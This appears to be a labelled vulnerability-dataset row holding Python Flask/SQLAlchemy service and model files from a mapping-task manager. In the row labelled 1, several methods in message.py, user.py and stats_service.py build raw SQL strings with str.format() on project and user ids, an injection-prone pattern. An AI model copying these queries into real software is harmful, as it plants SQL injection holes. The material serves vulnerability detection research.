            .group_by(Project.campaign_tag).all()
        no_campaign_count = 0
        unique_campaigns = 0

        for tup in campaign_count:
            campaign_stats = CampaignStatsDTO(tup)
            if campaign_stats.tag:
                dto.campaigns.append(campaign_stats)
                unique_campaigns += 1
            else:
                no_campaign_count += campaign_stats.projects_created

        if no_campaign_count:
            no_campaign_proj = CampaignStatsDTO(('Untagged', no_campaign_count))
            dto.campaigns.append(no_campaign_proj)
        dto.total_campaigns = unique_campaigns

        org_proj_count = db.session.query(Project.organisation_tag, func.count(Project.organisation_tag))\
            .group_by(Project.organisation_tag).all()
        no_org_count = 0
        unique_orgs = 0

        for tup in org_proj_count:
            org_stats = OrganizationStatsDTO(tup)
            if org_stats.tag:
                dto.organizations.append(org_stats)
                unique_orgs += 1
            else:
                no_org_count += org_stats.projects_created

        if no_org_count:
            no_org_proj = OrganizationStatsDTO(('Untagged', no_org_count))
            dto.organizations.append(no_org_proj)
        dto.total_organizations = unique_orgs

        return dto
/n/n/nserver/services/users/user_service.py/n/nfrom cachetools import TTLCache, cached
from flask import current_app
from functools import reduce
import dateutil.parser
import datetime

from sqlalchemy import text

from server import db
from server.models.dtos.user_dto import UserDTO, UserOSMDTO, UserFilterDTO, UserSearchQuery, UserSearchDTO, \
    UserStatsDTO
from server.models.dtos.message_dto import MessageDTO
from server.models.postgis.message import Message
from server.models.postgis.task import TaskHistory
from server.models.postgis.user import User, UserRole, MappingLevel
from server.models.postgis.utils import NotFound
from server.services.users.osm_service import OSMService, OSMServiceError
from server.services.messaging.smtp_service import SMTPService
from server.services.messaging.template_service import get_template

user_filter_cache = TTLCache(maxsize=1024, ttl=600)
user_all_cache = TTLCache(maxsize=1024, ttl=600)


class UserServiceError(Exception):
    """""" Custom Exception to notify callers an error occurred when in the User Service """"""

    def __init__(self, message):
        if current_app:
            current_app.logger.error(message)


class UserService:
    @staticmethod
    def get_user_by_id(user_id: int) -> User:
        user = User().get_by_id(user_id)

        if user is None:
            raise NotFound()

        return user

    @staticmethod
    def get_user_by_username(username: str) -> User:
        user = User().get_by_username(username)

        if user is None:
            raise NotFound()

        return user

    @staticmethod
    def update_username(user_id: int, osm_username: str) -> User:
        user = UserService.get_user_by_id(user_id)
        if user.username != osm_username:
            user.update_username(osm_username)

        return user

    @staticmethod
    def register_user(osm_id, username, changeset_count):
        """"""
        Creates user in DB
        :param osm_id: Unique OSM user id
        :param username: OSM Username
        :param changeset_count: OSM changeset count
        """"""
        new_user = User()
        new_user.id = osm_id
        new_user.username = username

        intermediate_level = current_app.config['MAPPER_LEVEL_INTERMEDIATE']
        advanced_level = current_app.config['MAPPER_LEVEL_ADVANCED']

        if changeset_count > advanced_level:
            new_user.mapping_level = MappingLevel.ADVANCED.value
        elif intermediate_level < changeset_count < advanced_level:
            new_user.mapping_level = MappingLevel.INTERMEDIATE.value
        else:
            new_user.mapping_level = MappingLevel.BEGINNER.value

        new_user.create()
        return new_user

    @staticmethod
    def get_user_dto_by_username(requested_username: str, logged_in_user_id: int) -> UserDTO:
        """"""Gets user DTO for supplied username """"""
        requested_user = UserService.get_user_by_username(requested_username)
        logged_in_user = UserService.get_user_by_id(logged_in_user_id)
        UserService.check_and_update_mapper_level(requested_user.id)

        return requested_user.as_dto(logged_in_user.username)

    @staticmethod
    def get_user_dto_by_id(requested_user: int) -> UserDTO:
        """"""Gets user DTO for supplied user id """"""
        requested_user = UserService.get_user_by_id(requested_user)

        return requested_user.as_dto(requested_user.username)

    @staticmethod
    def get_detailed_stats(username: str):
        user = UserService.get_user_by_username(username)
        stats_dto = UserStatsDTO()

        actions = TaskHistory.query.filter(
            TaskHistory.user_id == user.id,
            TaskHistory.action_text != ''
        ).all()

        tasks_mapped = TaskHistory.query.filter(
            TaskHistory.user_id == user.id,
            TaskHistory.action_text == 'MAPPED'
        ).count()
        tasks_validated = TaskHistory.query.filter(
            TaskHistory.user_id == user.id,
            TaskHistory.action_text == 'VALIDATED'
        ).count()
        projects_mapped = TaskHistory.query.filter(
            TaskHistory.user_id == user.id,
            TaskHistory.action == 'STATE_CHANGE'
        ).distinct(TaskHistory.project_id).count()

        stats_dto.tasks_mapped = tasks_mapped
        stats_dto.tasks_validated = tasks_validated
        stats_dto.projects_mapped = projects_mapped
        stats_dto.total_time_spent = 0
        stats_dto.time_spent_mapping = 0
        stats_dto.time_spent_validating = 0

        sql = """"""SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history
                WHERE action='LOCKED_FOR_VALIDATION'
                and user_id = :user_id;""""""
        total_validation_time = db.engine.execute(text(sql), user_id=user.id)
        for time in total_validation_time:
            total_validation_time = time[0]
            if total_validation_time:
                stats_dto.time_spent_validating = total_validation_time.total_seconds()
                stats_dto.total_time_spent += stats_dto.time_spent_validating

        sql = """"""SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history
                WHERE action='LOCKED_FOR_MAPPING'
                and user_id = :user_id;""""""
        total_mapping_time = db.engine.execute(text(sql), user_id=user.id)
        for time in total_mapping_time:
            total_mapping_time = time[0]
            if total_mapping_time:
                stats_dto.time_spent_mapping = total_mapping_time.total_seconds()
                stats_dto.total_time_spent += stats_dto.time_spent_mapping

        return stats_dto


    @staticmethod
    def update_user_details(user_id: int, user_dto: UserDTO) -> dict:
        """""" Update user with info supplied by user, if they add or change their email address a verification mail
            will be sent """"""
        user = UserService.get_user_by_id(user_id)

        verification_email_sent = False
        if user_dto.email_address and user.email_address != user_dto.email_address.lower():
            # Send user verification email if they are adding or changing their email address
            SMTPService.send_verification_email(user_dto.email_address.lower(), user.username)
            user.set_email_verified_status(is_verified=False)
            verification_email_sent = True

        user.update(user_dto)
        return dict(verificationEmailSent=verification_email_sent)

    @staticmethod
    @cached(user_all_cache)
    def get_all_users(query: UserSearchQuery) -> UserSearchDTO:
        """""" Gets paginated list of users """"""
        return User.get_all_users(query)

    @staticmethod
    @cached(user_filter_cache)
    def filter_users(username: str, project_id: int, page: int) -> UserFilterDTO:
        """""" Gets paginated list of users, filtered by username, for autocomplete """"""
        return User.filter_users(username, project_id, page)

    @staticmethod
    def is_user_a_project_manager(user_id: int) -> bool:
        """""" Is the user a project manager """"""
        user = UserService.get_user_by_id(user_id)
        if UserRole(user.role) in [UserRole.ADMIN, UserRole.PROJECT_MANAGER]:
            return True

        return False

    @staticmethod
    def get_mapping_level(user_id: int):
        """""" Gets mapping level user is at""""""
        user = UserService.get_user_by_id(user_id)

        return MappingLevel(user.mapping_level)

    @staticmethod
    def is_user_validator(user_id: int) -> bool:
        """""" Determines if user is a validator """"""
        user = UserService.get_user_by_id(user_id)

        if UserRole(user.role) in [UserRole.VALIDATOR, UserRole.ADMIN, UserRole.PROJECT_MANAGER]:
            return True

        return False

    @staticmethod
    def is_user_blocked(user_id: int) -> bool:
        """""" Determines if a user is blocked """"""
        user = UserService.get_user_by_id(user_id)

        if UserRole(user.role) == UserRole.READ_ONLY:
            return True

        return False

    @staticmethod
    def upsert_mapped_projects(user_id: int, project_id: int):
        """""" Add project to mapped projects if it doesn't exist, otherwise return """"""
        User.upsert_mapped_projects(user_id, project_id)

    @staticmethod
    def get_mapped_projects(user_name: str, preferred_locale: str):
        """""" Gets all projects a user has mapped or validated on """"""
        user = UserService.get_user_by_username(user_name)
        return User.get_mapped_projects(user.id, preferred_locale)

    @staticmethod
    def add_role_to_user(admin_user_id: int, username: str, role: str):
        """"""
        Add role to user
        :param admin_user_id: ID of admin attempting to add the role
        :param username: Username of user the role should be added to
        :param role: The requested role
        :raises UserServiceError
        """"""
        try:
            requested_role = UserRole[role.upper()]
        except KeyError:
            raise UserServiceError(f'Unknown role {role} accepted values are ADMIN, PROJECT_MANAGER, VALIDATOR')

        admin = UserService.get_user_by_id(admin_user_id)
        admin_role = UserRole(admin.role)

        if admin_role == UserRole.PROJECT_MANAGER and requested_role == UserRole.ADMIN:
            raise UserServiceError(f'You must be an Admin to assign Admin role')

        if admin_role == UserRole.PROJECT_MANAGER and requested_role == UserRole.PROJECT_MANAGER:
            raise UserServiceError(f'You must be an Admin to assign Project Manager role')

        user = UserService.get_user_by_username(username)
        user.set_user_role(requested_role)

    @staticmethod
    def set_user_mapping_level(username: str, level: str) -> User:
        """"""
        Sets the users mapping level
        :raises: UserServiceError
        """"""
        try:
            requested_level = MappingLevel[level.upper()]
        except KeyError:
            raise UserServiceError(f'Unknown role {level} accepted values are BEGINNER, INTERMEDIATE, ADVANCED')

        user = UserService.get_user_by_username(username)
        user.set_mapping_level(requested_level)

        return user

    @staticmethod
    def set_user_is_expert(user_id: int, is_expert: bool) -> User:
        """"""
        Enabled or disables expert mode for the user
        :raises: UserServiceError
        """"""
        user = UserService.get_user_by_id(user_id)
        user.set_is_expert(is_expert)

        return user

    @staticmethod
    def accept_license_terms(user_id: int, license_id: int):
        """""" Saves the fact user has accepted license terms """"""
        user = UserService.get_user_by_id(user_id)
        user.accept_license_terms(license_id)

    @staticmethod
    def has_user_accepted_license(user_id: int, license_id: int):
        """""" Checks if user has accepted specified license """"""
        user = UserService.get_user_by_id(user_id)
        return user.has_user_accepted_licence(license_id)

    @staticmethod
    def get_osm_details_for_user(username: str) -> UserOSMDTO:
        """"""
        Gets OSM details for the user from OSM API
        :param username: username in scope
        :raises UserServiceError, NotFound
        """"""
        user = UserService.get_user_by_username(username)
        osm_dto = OSMService.get_osm_details_for_user(user.id)
        return osm_dto

    @staticmethod
    def check_and_update_mapper_level(user_id: int):
        """""" Check users mapping level and update if they have crossed threshold """"""
        user = UserService.get_user_by_id(user_id)
        user_level = MappingLevel(user.mapping_level)

        if user_level == MappingLevel.ADVANCED:
            return  # User has achieved highest level, so no need to do further checking

        intermediate_level = current_app.config['MAPPER_LEVEL_INTERMEDIATE']
        advanced_level = current_app.config['MAPPER_LEVEL_ADVANCED']

        try:
            osm_details = OSMService.get_osm_details_for_user(user_id)
            if (osm_details.changeset_count > advanced_level and
                user.mapping_level !=  MappingLevel.ADVANCED.value):
                user.mapping_level = MappingLevel.ADVANCED.value
                UserService.notify_level_upgrade(user_id, user.username, 'ADVANCED')
            elif (intermediate_level < osm_details.changeset_count < advanced_level and
                user.mapping_level != MappingLevel.INTERMEDIATE.value):
                user.mapping_level = MappingLevel.INTERMEDIATE.value
                UserService.notify_level_upgrade(user_id, user.username, 'INTERMEDIATE')
        except OSMServiceError:
            # Swallow exception as we don't want to blow up the server for this
            current_app.logger.error('Error attempting to update mapper level')
            return


        user.save()
        return user

    def notify_level_upgrade(user_id: int, username: str, level: str):
        text_template = get_template('level_upgrade_message_en.txt')

        if username is not None:
            text_template = text_template.replace('[USERNAME]', username)

        text_template = text_template.replace('[LEVEL]', level)
        level_upgrade_message = Message()
        level_upgrade_message.to_user_id = user_id
        level_upgrade_message.subject = 'Mapper Level Upgrade '
        level_upgrade_message.message = text_template
        level_upgrade_message.save()


    @staticmethod
    def refresh_mapper_level() -> int:
        """""" Helper function to run thru all users in the DB and update their mapper level """"""
        users = User.get_all_users_not_pagainated()
        users_updated = 1
        total_users = len(users)

        for user in users:
            UserService.check_and_update_mapper_level(user.id)

            if users_updated % 50 == 0:
                print(f'{users_updated} users updated of {total_users}')

            users_updated += 1

        return users_updated
/n/n/n",0
1,1,dee040a2d22b3c4d5e38e2dbf8c6b651ad4c241a,"/server/models/postgis/message.py/n/nfrom server import db
from flask import current_app
from enum import Enum
from server.models.dtos.message_dto import MessageDTO, MessagesDTO
from server.models.postgis.user import User
from server.models.postgis.task import Task
from server.models.postgis.project import Project
from server.models.postgis.utils import timestamp
from server.models.postgis.utils import NotFound

class MessageType(Enum):
    """""" Describes the various kinds of messages a user might receive """"""
    SYSTEM = 1                     # Generic system-generated message
    BROADCAST = 2                  # Broadcast message from a project manager
    MENTION_NOTIFICATION = 3       # Notification that user was mentioned in a comment/chat
    VALIDATION_NOTIFICATION = 4    # Notification that user's mapped task was validated
    INVALIDATION_NOTIFICATION = 5  # Notification that user's mapped task was invalidated

class Message(db.Model):
    """""" Describes an individual Message a user can send """"""
    __tablename__ = ""messages""

    __table_args__ = (
        db.ForeignKeyConstraint(['task_id', 'project_id'], ['tasks.id', 'tasks.project_id']),
    )

    id = db.Column(db.Integer, primary_key=True)
    message = db.Column(db.String)
    subject = db.Column(db.String)
    from_user_id = db.Column(db.BigInteger, db.ForeignKey('users.id'))
    to_user_id = db.Column(db.BigInteger, db.ForeignKey('users.id'), index=True)
    project_id = db.Column(db.Integer, db.ForeignKey('projects.id'), index=True)
    task_id = db.Column(db.Integer, index=True)
    message_type = db.Column(db.Integer, index=True)
    date = db.Column(db.DateTime, default=timestamp)
    read = db.Column(db.Boolean, default=False)

    # Relationships
    from_user = db.relationship(User, foreign_keys=[from_user_id])
    to_user = db.relationship(User, foreign_keys=[to_user_id], backref='messages')
    project = db.relationship(Project, foreign_keys=[project_id], backref='messages')
    task = db.relationship(Task, primaryjoin=""and_(Task.id == foreign(Message.task_id), Task.project_id == Message.project_id)"",
        backref='messages')

    @classmethod
    def from_dto(cls, to_user_id: int, dto: MessageDTO):
        """""" Creates new message from DTO """"""
        message = cls()
        message.subject = dto.subject
        message.message = dto.message
        message.from_user_id = dto.from_user_id
        message.to_user_id = to_user_id
        message.project_id = dto.project_id
        message.task_id = dto.task_id
        if dto.message_type is not None:
            message.message_type = MessageType(dto.message_type)

        return message

    def as_dto(self) -> MessageDTO:
        """""" Casts message object to DTO """"""
        dto = MessageDTO()
        dto.message_id = self.id
        dto.message = self.message
        dto.sent_date = self.date
        dto.read = self.read
        dto.subject = self.subject
        dto.project_id = self.project_id
        dto.task_id = self.task_id
        if self.message_type is not None:
            dto.message_type = MessageType(self.message_type).name

        if self.from_user_id:
            dto.from_username = self.from_user.username

        return dto

    def add_message(self):
        """""" Add message into current transaction - DO NOT COMMIT HERE AS MESSAGES ARE PART OF LARGER TRANSACTIONS""""""
        current_app.logger.debug('Adding message to session')
        db.session.add(self)

    def save(self):
        """""" Save """"""
        db.session.add(self)
        db.session.commit()

    @staticmethod
    def get_all_contributors(project_id: int):
        """""" Get all contributors to a project """"""
        query = '''SELECT mapped_by as contributors from tasks where project_id = {0} and  mapped_by is not null
                   UNION
                   SELECT validated_by from tasks where tasks.project_id = {0} and validated_by is not null'''.format(project_id)

        contributors = db.engine.execute(query)
        return contributors

    def mark_as_read(self):
        """""" Mark the message in scope as Read """"""
        self.read = True
        db.session.commit()

    @staticmethod
    def get_unread_message_count(user_id: int):
        """""" Get count of unread messages for user """"""
        return Message.query.filter(Message.to_user_id == user_id, Message.read == False).count()

    @staticmethod
    def get_all_messages(user_id: int) -> MessagesDTO:
        """""" Gets all messages to the user """"""
        user_messages = Message.query.filter(Message.to_user_id == user_id).all()

        if len(user_messages) == 0:
            raise NotFound()

        messages_dto = MessagesDTO()
        for message in user_messages:
            messages_dto.user_messages.append(message.as_dto())

        return messages_dto

    @staticmethod
    def delete_multiple_messages(message_ids: list, user_id: int):
        """""" Deletes the specified messages to the user """"""
        Message.query.filter(Message.to_user_id == user_id, Message.id.in_(message_ids)).\
                delete(synchronize_session=False)
        db.session.commit()

    def delete(self):
        """""" Deletes the current model from the DB """"""
        db.session.delete(self)
        db.session.commit()
/n/n/n/server/models/postgis/user.py/n/nimport geojson
import datetime
import dateutil.parser
from server import db
from sqlalchemy import desc
from server.models.dtos.user_dto import UserDTO, UserMappedProjectsDTO, MappedProject, UserFilterDTO, Pagination, \
    UserSearchQuery, UserSearchDTO, ProjectParticipantUser, ListedUser
from server.models.postgis.licenses import License, users_licenses_table
from server.models.postgis.project_info import ProjectInfo
from server.models.postgis.statuses import MappingLevel, ProjectStatus, UserRole
from server.models.postgis.utils import NotFound, timestamp

class User(db.Model):
    """""" Describes the history associated with a task """"""
    __tablename__ = ""users""

    id = db.Column(db.BigInteger, primary_key=True, index=True)
    validation_message = db.Column(db.Boolean, default=True, nullable=False)
    username = db.Column(db.String, unique=True)
    role = db.Column(db.Integer, default=0, nullable=False)
    mapping_level = db.Column(db.Integer, default=1, nullable=False)
    projects_mapped = db.Column(db.Integer, default=1, nullable=False)
    tasks_mapped = db.Column(db.Integer, default=0, nullable=False)
    tasks_validated = db.Column(db.Integer, default=0, nullable=False)
    tasks_invalidated = db.Column(db.Integer, default=0, nullable=False)
    projects_mapped = db.Column(db.ARRAY(db.Integer))
    email_address = db.Column(db.String)
    is_email_verified = db.Column(db.Boolean, default=False)
    is_expert = db.Column(db.Boolean, default=False)
    twitter_id = db.Column(db.String)
    facebook_id = db.Column(db.String)
    linkedin_id = db.Column(db.String)
    date_registered = db.Column(db.DateTime, default=timestamp)
    # Represents the date the user last had one of their tasks validated
    last_validation_date = db.Column(db.DateTime, default=timestamp)

    # Relationships
    accepted_licenses = db.relationship(""License"", secondary=users_licenses_table)

    def create(self):
        """""" Creates and saves the current model to the DB """"""
        db.session.add(self)
        db.session.commit()

    def save(self):
        db.session.commit()

    def get_by_id(self, user_id: int):
        """""" Return the user for the specified id, or None if not found """"""
        return User.query.get(user_id)

    def get_by_username(self, username: str):
        """""" Return the user for the specified username, or None if not found """"""
        return User.query.filter_by(username=username).one_or_none()

    def update_username(self, username: str):
        """""" Update the username """"""
        self.username = username
        db.session.commit()

    def update(self, user_dto: UserDTO):
        """""" Update the user details """"""
        self.email_address = user_dto.email_address.lower() if user_dto.email_address else None
        self.twitter_id = user_dto.twitter_id.lower() if user_dto.twitter_id else None
        self.facebook_id = user_dto.facebook_id.lower() if user_dto.facebook_id else None
        self.linkedin_id = user_dto.linkedin_id.lower() if user_dto.linkedin_id else None
        self.validation_message = user_dto.validation_message
        db.session.commit()

    def set_email_verified_status(self, is_verified: bool):
        """""" Updates email verfied flag on successfully verified emails""""""
        self.is_email_verified = is_verified
        db.session.commit()

    def set_is_expert(self, is_expert: bool):
        """""" Enables or disables expert mode on the user""""""
        self.is_expert = is_expert
        db.session.commit()

    @staticmethod
    def get_all_users(query: UserSearchQuery) -> UserSearchDTO:
        """""" Search and filter all users """"""

        # Base query that applies to all searches
        base = db.session.query(User.id, User.username, User.mapping_level, User.role)

        # Add filter to query as required
        if query.mapping_level:
            base = base.filter(User.mapping_level == MappingLevel[query.mapping_level.upper()].value)
        if query.username:
            base = base.filter(User.username.ilike(query.username.lower() + '%'))
        if query.role:
            base = base.filter(User.role == UserRole[query.role.upper()].value)

        results = base.order_by(User.username).paginate(query.page, 20, True)

        dto = UserSearchDTO()
        for result in results.items:
            listed_user = ListedUser()
            listed_user.id = result.id
            listed_user.mapping_level = MappingLevel(result.mapping_level).name
            listed_user.username = result.username
            listed_user.role = UserRole(result.role).name

            dto.users.append(listed_user)

        dto.pagination = Pagination(results)
        return dto

    @staticmethod
    def get_all_users_not_pagainated():
        """""" Get all users in DB""""""
        return db.session.query(User.id).all()


    @staticmethod
    def filter_users(user_filter: str, project_id: int, page: int) -> UserFilterDTO:
        """""" Finds users that matches first characters, for auto-complete.

        Users who have participated (mapped or validated) in the project, if given, will be
        returned ahead of those who have not.
        """"""
        # Note that the projects_mapped column includes both mapped and validated projects.
        results = db.session.query(User.username, User.projects_mapped.any(project_id).label(""participant"")) \
            .filter(User.username.ilike(user_filter.lower() + '%')) \
            .order_by(desc(""participant"").nullslast(), User.username).paginate(page, 20, True)
        if results.total == 0:
            raise NotFound()

        dto = UserFilterDTO()
        for result in results.items:
            dto.usernames.append(result.username)
            if project_id is not None:
                participant = ProjectParticipantUser()
                participant.username = result.username
                participant.project_id = project_id
                participant.is_participant = bool(result.participant)
                dto.users.append(participant)

        dto.pagination = Pagination(results)
        return dto

    @staticmethod
    def upsert_mapped_projects(user_id: int, project_id: int):
        """""" Adds projects to mapped_projects if it doesn't exist """"""
        sql = ""select * from users where id = {0} and projects_mapped @> '{{{1}}}'"".format(user_id, project_id)
        result = db.engine.execute(sql)

        if result.rowcount > 0:
            return  # User has previously mapped this project so return

        sql = '''update users
                    set projects_mapped = array_append(projects_mapped, {0})
                  where id = {1}'''.format(project_id, user_id)

        db.engine.execute(sql)

    @staticmethod
    def get_mapped_projects(user_id: int, preferred_locale: str) -> UserMappedProjectsDTO:
        """""" Get all projects a user has mapped on """"""

        # This query looks scary, but we're really just creating an outer join between the query that gets the
        # counts of all mapped tasks and the query that gets counts of all validated tasks.  This is necessary to
        # handle cases where users have only validated tasks on a project, or only mapped on a project.
        sql = '''SELECT p.id,
                        p.status,
                        p.default_locale,
                        c.mapped,
                        c.validated,
                        st_asgeojson(p.centroid)
                   FROM projects p,
                        (SELECT coalesce(v.project_id, m.project_id) project_id,
                                coalesce(v.validated, 0) validated,
                                coalesce(m.mapped, 0) mapped
                          FROM (SELECT t.project_id,
                                       count (t.validated_by) validated
                                  FROM tasks t
                                 WHERE t.project_id IN (SELECT unnest(projects_mapped) FROM users WHERE id = {0})
                                   AND t.validated_by = {0}
                                 GROUP BY t.project_id, t.validated_by) v
                         FULL OUTER JOIN
                        (SELECT t.project_id,
                                count(t.mapped_by) mapped
                           FROM tasks t
                          WHERE t.project_id IN (SELECT unnest(projects_mapped) FROM users WHERE id = {0})
                            AND t.mapped_by = {0}
                          GROUP BY t.project_id, t.mapped_by) m
                         ON v.project_id = m.project_id) c
                   WHERE p.id = c.project_id ORDER BY p.id DESC'''.format(user_id)

        results = db.engine.execute(sql)

        if results.rowcount == 0:
            raise NotFound()

        mapped_projects_dto = UserMappedProjectsDTO()
        for row in results:
            mapped_project = MappedProject()
            mapped_project.project_id = row[0]
            mapped_project.status = ProjectStatus(row[1]).name
            mapped_project.tasks_mapped = row[3]
            mapped_project.tasks_validated = row[4]
            mapped_project.centroid = geojson.loads(row[5])

            project_info = ProjectInfo.get_dto_for_locale(row[0], preferred_locale, row[2])
            mapped_project.name = project_info.name

            mapped_projects_dto.mapped_projects.append(mapped_project)

        return mapped_projects_dto

    def set_user_role(self, role: UserRole):
        """""" Sets the supplied role on the user """"""
        self.role = role.value
        db.session.commit()

    def set_mapping_level(self, level: MappingLevel):
        """""" Sets the supplied level on the user """"""
        self.mapping_level = level.value
        db.session.commit()

    def accept_license_terms(self, license_id: int):
        """""" Associate the user in scope with the supplied license """"""
        image_license = License.get_by_id(license_id)
        self.accepted_licenses.append(image_license)
        db.session.commit()

    def has_user_accepted_licence(self, license_id: int):
        """""" Test to see if the user has accepted the terms of the specified license""""""
        image_license = License.get_by_id(license_id)

        if image_license in self.accepted_licenses:
            return True

        return False

    def delete(self):
        """""" Delete the user in scope from DB """"""
        db.session.delete(self)
        db.session.commit()

    def as_dto(self, logged_in_username: str) -> UserDTO:
        """""" Create DTO object from user in scope """"""
        user_dto = UserDTO()
        user_dto.id = self.id
        user_dto.username = self.username
        user_dto.role = UserRole(self.role).name
        user_dto.mapping_level = MappingLevel(self.mapping_level).name
        user_dto.is_expert = self.is_expert or False
        user_dto.date_registered = str(self.date_registered)
        try:
            user_dto.projects_mapped = len(self.projects_mapped)
        # Handle users that haven't touched a project yet.
        except:
            user_dto.projects_mapped = 0
        user_dto.tasks_mapped = self.tasks_mapped
        user_dto.tasks_validated = self.tasks_validated
        user_dto.tasks_invalidated = self.tasks_invalidated
        user_dto.twitter_id = self.twitter_id
        user_dto.linkedin_id = self.linkedin_id
        user_dto.facebook_id = self.facebook_id
        user_dto.validation_message = self.validation_message
        user_dto.total_time_spent = 0
        user_dto.time_spent_mapping = 0
        user_dto.time_spent_validating = 0

        sql = """"""SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history
                WHERE action='LOCKED_FOR_VALIDATION'
                and user_id = {0};"""""".format(self.id)
        total_validation_time = db.engine.execute(sql)
        for row in total_validation_time:
            total_validation_time = row[0]
            if total_validation_time:
                total_validation_seconds = total_validation_time.total_seconds()
                user_dto.time_spent_validating = total_validation_seconds
                user_dto.total_time_spent += user_dto.time_spent_validating

        sql = """"""SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history
                WHERE action='LOCKED_FOR_MAPPING'
                and user_id = {0};"""""".format(self.id)
        total_mapping_time = db.engine.execute(sql)
        for row in total_mapping_time:
            total_mapping_time = row[0]
            if total_mapping_time:
                total_mapping_seconds = total_mapping_time.total_seconds()
                user_dto.time_spent_mapping = total_mapping_seconds
                user_dto.total_time_spent += user_dto.time_spent_mapping

        if self.username == logged_in_username:
            # Only return email address when logged in user is looking at their own profile
            user_dto.email_address = self.email_address
            user_dto.is_email_verified = self.is_email_verified
        return user_dto
/n/n/n/server/services/stats_service.py/n/nfrom cachetools import TTLCache, cached

from sqlalchemy import func, text
from server import db
from server.models.dtos.stats_dto import (
    ProjectContributionsDTO, UserContribution, Pagination, TaskHistoryDTO,
    ProjectActivityDTO, HomePageStatsDTO, OrganizationStatsDTO,
    CampaignStatsDTO
    )
from server.models.postgis.project import Project
from server.models.postgis.statuses import TaskStatus
from server.models.postgis.task import TaskHistory, User, Task
from server.models.postgis.utils import timestamp, NotFound
from server.services.project_service import ProjectService
from server.services.users.user_service import UserService


homepage_stats_cache = TTLCache(maxsize=4, ttl=30)


class StatsService:

    @staticmethod
    def update_stats_after_task_state_change(project_id: int, user_id: int, last_state: TaskStatus,
                                             new_state: TaskStatus, action='change'):
        """""" Update stats when a task has had a state change """"""

        if new_state in [TaskStatus.READY, TaskStatus.LOCKED_FOR_VALIDATION, TaskStatus.LOCKED_FOR_MAPPING]:
            return  # No stats to record for these states

        project = ProjectService.get_project_by_id(project_id)
        user = UserService.get_user_by_id(user_id)

        StatsService._update_tasks_stats(project, user, last_state, new_state, action)
        UserService.upsert_mapped_projects(user_id, project_id)
        project.last_updated = timestamp()

        # Transaction will be saved when task is saved
        return project, user

    @staticmethod
    def _update_tasks_stats(project: Project, user: User, last_state: TaskStatus, new_state: TaskStatus,
                            action='change'):

        # Make sure you are aware that users table has it as incrementing counters,
        # while projects table reflect the actual state, and both increment and decrement happens

        # Set counters for new state
        if new_state == TaskStatus.MAPPED:
            project.tasks_mapped += 1
        elif new_state == TaskStatus.VALIDATED:
            project.tasks_validated += 1
        elif new_state == TaskStatus.BADIMAGERY:
            project.tasks_bad_imagery += 1

        if action == 'change':
            if new_state == TaskStatus.MAPPED:
                user.tasks_mapped += 1
            elif new_state == TaskStatus.VALIDATED:
                user.tasks_validated += 1
            elif new_state == TaskStatus.INVALIDATED:
                user.tasks_invalidated += 1

        # Remove counters for old state
        if last_state == TaskStatus.MAPPED:
            project.tasks_mapped -= 1
        elif last_state == TaskStatus.VALIDATED:
            project.tasks_validated -= 1
        elif last_state == TaskStatus.BADIMAGERY:
            project.tasks_bad_imagery -= 1

        if action == 'undo':
            if last_state == TaskStatus.MAPPED:
                user.tasks_mapped -= 1
            elif last_state == TaskStatus.VALIDATED:
                user.tasks_validated -= 1
            elif last_state == TaskStatus.INVALIDATED:
                user.tasks_invalidated -= 1

    @staticmethod
    def get_latest_activity(project_id: int, page: int) -> ProjectActivityDTO:
        """""" Gets all the activity on a project """"""

        results = db.session.query(
                TaskHistory.id, TaskHistory.task_id, TaskHistory.action, TaskHistory.action_date,
                TaskHistory.action_text, User.username
            ).join(User).filter(
                TaskHistory.project_id == project_id,
                TaskHistory.action != 'COMMENT'
            ).order_by(
                TaskHistory.action_date.desc()
            ).paginate(page, 10, True)

        if results.total == 0:
            raise NotFound()

        activity_dto = ProjectActivityDTO()
        for item in results.items:
            history = TaskHistoryDTO()
            history.history_id = item.id
            history.task_id = item.task_id
            history.action = item.action
            history.action_text = item.action_text
            history.action_date = item.action_date
            history.action_by = item.username
            activity_dto.activity.append(history)

        activity_dto.pagination = Pagination(results)
        return activity_dto

    @staticmethod
    def get_user_contributions(project_id: int) -> ProjectContributionsDTO:
        """""" Get all user contributions on a project""""""
        contrib_query = '''select m.mapped_by, m.username, m.mapped, v.validated_by, v.username, v.validated
                             from (select t.mapped_by, u.username, count(t.mapped_by) mapped
                                     from tasks t,
                                          users u
                                    where t.mapped_by = u.id
                                      and t.project_id = {0}
                                      and t.mapped_by is not null
                                    group by t.mapped_by, u.username) m FULL OUTER JOIN
                                  (select t.validated_by, u.username, count(t.validated_by) validated
                                     from tasks t,
                                          users u
                                    where t.validated_by = u.id
                                      and t.project_id = {0}
                                      and t.validated_by is not null
                                    group by t.validated_by, u.username) v
                                       ON m.mapped_by = v.validated_by
        '''.format(project_id)

        results = db.engine.execute(contrib_query)
        if results.rowcount == 0:
            raise NotFound()

        contrib_dto = ProjectContributionsDTO()
        for row in results:
            user_id = row[0] or row[3]
            user_contrib = UserContribution()
            user_contrib.username = row[1] if row[1] else row[4]
            user_contrib.mapped = row[2] if row[2] else 0
            user_contrib.validated = row[5] if row[5] else 0
            contrib_dto.user_contributions.append(user_contrib)
        return contrib_dto

    @staticmethod
    @cached(homepage_stats_cache)
    def get_homepage_stats() -> HomePageStatsDTO:
        """""" Get overall TM stats to give community a feel for progress that's being made """"""
        dto = HomePageStatsDTO()

        dto.total_projects = Project.query.count()
        dto.mappers_online = Task.query.filter(
            Task.locked_by is not None
            ).distinct(Task.locked_by).count()
        dto.total_mappers = User.query.count()
        dto.total_validators = Task.query.filter(
            Task.task_status == TaskStatus.VALIDATED.value
            ).distinct(Task.validated_by).count()
        dto.tasks_mapped = Task.query.filter(
            Task.task_status.in_(
                (TaskStatus.MAPPED.value, TaskStatus.VALIDATED.value)
                )
            ).count()
        dto.tasks_validated = Task.query.filter(
            Task.task_status == TaskStatus.VALIDATED.value
            ).count()

        org_proj_count = db.session.query(
            Project.organisation_tag,
            func.count(Project.organisation_tag)
        ).group_by(Project.organisation_tag).all()

        untagged_count = 0

        # total_area = 0



       # dto.total_area = 0

        # total_area_sql = """"""select sum(ST_Area(geometry)) from public.projects as area""""""

        # total_area_result = db.engine.execute(total_area_sql)
        # current_app.logger.debug(total_area_result)
